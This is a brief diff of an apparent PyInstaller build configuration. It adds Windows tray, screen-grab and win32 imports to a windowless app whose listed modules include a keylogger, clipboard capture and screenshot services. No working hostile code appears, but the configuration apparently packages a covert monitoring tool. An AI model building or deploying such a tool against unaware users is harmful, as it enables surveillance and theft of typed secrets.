@@ -13,7 +13,7 @@ ICON_PATH = ASSETS_DIR / "icon.jpg"
 COMMON_ARGS = {
     "name": APP_NAME,
     "console": False,  # No console window
-    "onefile": True,   # Single executable file
+    "onefile": False,
     "noconfirm": True,
     "log_level": "INFO",
 }
@@ -42,6 +42,18 @@ PLATFORM_CONFIG = {
 # Hidden imports (modules not automatically detected)
 HIDDEN_IMPORTS = [
     "rumps",
+    "pystray",
+    "pystray._win32",
+    "pystray._util.win32",
+    "PIL",
+    "PIL.Image",
+    "PIL.ImageGrab",
+    "win32api",
+    "win32con",
+    "win32event",
+    "win32gui",
+    "winerror",
+    "pywintypes",
     "services.keylogger",
     "services.clipboard",
     "services.screenshot",
